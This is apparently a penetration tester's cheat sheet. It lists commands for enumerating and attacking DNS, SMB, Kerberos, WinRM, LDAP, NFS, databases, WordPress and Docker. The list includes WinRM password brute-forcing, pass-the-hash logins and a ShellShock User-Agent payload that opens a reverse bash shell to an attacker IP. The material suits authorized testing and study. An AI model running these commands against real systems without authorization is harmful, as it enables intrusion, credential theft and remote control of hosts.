### [DNS Recon]
```
dig axfr @<IP> <DOMAINNAME>

Enumerating DNS Records
dnsrecon -d domain

Zone Transfers
host -t ns domain
host -l domain ns.newdomain.xyz

Tools created:
cname_lookup
Usage: ./cname_lookup subdomain.domain.com

zone_xfer
Usage: ./zone_xfer example.com 
```

### Sub Domain Takover
https://www.hackerone.com/blog/Guide-Subdomain-Takeovers

### [rpc Enumeration]
```
rpcclient <IP>

rpcclient -U "" <IP>

enumdomusers

queryusergroups <RID>
```
### [rpc enumeration]
https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html

### [SMB Enumeration p445]
SMBClient
```
smbclient //<IP>/share
smbclient '//<IP>/share$'

Retrieving data from share
smbclient //<IP>/share
RECURSE ON
PROMPT OFF
mget *
```

Null Session
```
smbclient -L <IP>
smbclient -L <IP> -U ''
smbclient -L <IP> -U '' -P 'abc'
smbclient -N //IP/Sub
```
SMBv2 Mode
```
smbclient -m SMB2 '//<IP>/c$/path/to/share' -W <WORKSTATION> -U <username>
```

smbmap commands
```
Smbmap -H <ipaddress>
```
```
Smbmap -H <ipaddress> -u <username>
```
```
Smbmap -H <ipaddress> -u <username> -R
```
```
Smbmap -u <username> -d <domain> -p 'password' -H <ipaddress>
```
```
smbmap -u <username> -p <hash> -H <ipaddress>
```

Enum4linux
```
enum4linux -a <IP>
```

smbcacls
```
smbcacls -N '//<IP>/Sub' /Users
```

### [Crackmapexec]
```
crackmapexec smb <IP> --shares -u ''

crackmapexec smb <IP> --shares -u '' -p ''

crackmapexec smb <IP> --shares -u 'null'

crackmapexec smb <IP> --shares -u 'null' -p ''

crackmapexec winrm <IP> -u USERNAME -p password

crackmapexec winrm <IP> -u USERNAME -H hash

crackmapexec smb <IP> --pass-pol -u '' -p ''
```

### [smbclient]
```
smbclient.py <IP> -port 445
smbclient.py WORKGROUP/anonymous@IP
login <account>
shares
use <share name>
```

### [SMB VULN Check]
```
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

### [SMB Relay attack]
https://www.youtube.com/watch?v=ctLVMi1_zBc&feature=emb_title

### [Kerberos Enumeration p88]
```
GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist

python3 GetNPUsers.py <DOMAIN/ -usersfile /path/to/users.txt -dc-ip <DCIP>
```

### [kerbrute]
Kerberos enumeration using kerbrute github.com/ropnop/kerbrute dowwnload the release   
```
kerbrute userenum --dc <IP> -d domain.local -o out_kerbuser.txt users.list  
```
resources:

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### [Windows Remote Management WinRM p5985]
https://github.com/Hackplayers/evil-winrm

```
ruby evil-winrm.rb -i <IP> -u <USERNAME> -p '<PASSWORD>' -s '/path/to/scripts/' -e '/path/to/exes/'
```
Download / Upload
```
upload local_filename
download remote_filename
```

### [Mounting NFS]

Display NFS
```
showmount -e IP
```
mount NFS
```
mkdir /tmp/yoursubdirectory
mount -t nfs 0.0.0.0:/subdirectory /tmp/yoursubdirectory
sudo mount -t cifs -o 'user=<USER>,password=<PASSWORD' //<IP>/share /mnt/sharename

Permission Denied Error?
Create the user by typing:
adduser <username>

Set ID to mounted users ID
nano /etc/passwd
```
unmount NFS
```
sudo umount /mnt
umount -f /tmp/subdirectory
```

### [if profiles can be viewed from smb]
on a folder with profile names type ls > /location/to/output/users.list

### [firewall evasion]
```
nmap -sC -sV -F -D RND:1 host
```

### Useful Resources and Tools

https://gchq.github.io/CyberChef
https://crackstation.net/

Adding your domains to your scope within burp (https://forum.portswigger.net/thread/how-do-i-add-al-subdomains-to-scope-77e3e61a)
```
.*\.test\.com$
```

### [Enumerate SMTP]
```
sudo apt-get install smtp-user-enum
apt-get install ismtp

smtp-user-enum -M VRFY -U users.txt -t <ipaddr>
```

### [ldap]
```
ldapsearch -x -b "dc=domain,dc=com" -H ldap://ipaddr
ldapsearch -x -b "dc=domain,dc=com" -H <ipaddr>

ldapsearch -h <IP> -x -b "DC=<DC>,DC=local"
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)'
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)' sAMAccountName
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName
```
https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/

### [bruteforcing winrm]
https://github.com/mchoji/winrm-brute

```
winrm-brute.rb -U users.txt -P passwords.txt x.x.x.x
```

### [shortname scanning]
https://github.com/irsdl/IIS-ShortName-Scanner
```
java -jar /path/to/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://x.x.x.x
/path/to/IIS-ShortName-Scanner/config.xml
```

### [Connecting to mysql]
https://docs.rackspace.com/support/how-to/mysql-connect-to-your-database-remotely/
```
mysql -u username -p -h <IP>

mysql -h ip -u root
mysql -h ip -u root -p
mysql -h ip -u root -p database_name
mysql -u <USERNAME> -p<PASSWORD> -e "use <database>;select * from <tablename>;"
```
### [Resources]
https://www.youtube.com/watch?v=p4JgIu1mceI  
https://github.com/Tib3rius/AutoRecon  

### nmap vulners
https://github.com/vulnersCom/nmap-vulners
```
nmap -sV --script vulners --script-args mincvss=5.0 <target>
nmap --script http-vulners-regex.nse --script-args paths={"/"} <target> 

root@kali:~# nmap -sC -sV -v -p- --script vulners --script-args mincvss=5.0 <target> --min-rate=6000
```

### telnet POP email
```
telnet <IP> 110
USER <username>
PASS <password>

List emails
LIST

Display an email by number
RETR # 
```

### [bloodhound.py]
https://github.com/fox-it/BloodHound.py
```
python3 bloodhound.py -u <USERNAME> -p '<PASSWORD>' -ns <IP> -d domain.local -c all
```

### [postgres]
```
Enumerating Postgres Version:
auxiliary/scanner/postgres/postgres_version

Bruteforce Login:
auxiliary/scanner/postgres/postgres_login

Accessing postress:
psql -h <IPADDRESS> -U postgres
```
Aritcle: https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9

### [Wordpress]
xmlrpc  
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  

Wordpress Scanning  
`wpscan --url <URL> --enumerate u,vp,vt,cb,dbe --random-user-agent`  

https://blog.wpscan.com/wpscan/cheatsheet/poster/2019/11/05/wpscan-cli-cheat-sheet-poster.html  

### [Pentesting amqp]
https://book.hacktricks.xyz/pentesting/5671-5672-pentesting-amqp

### [Solaris finger enum]
http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

### [Docker Enumeration]
```
curl http://<IP>/version | jq

docker -H <IP>:<HOST> info

docker -H <IP>:<HOST> ps

docker -H <IP>:<HOST> ps -a

docker -H <IP>:<HOST> images
```

### [ShellShock]
```
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" <URL>/x.sh
```

### [Updating NMAP Script Engine]
```
nmap --script-updatedb
```
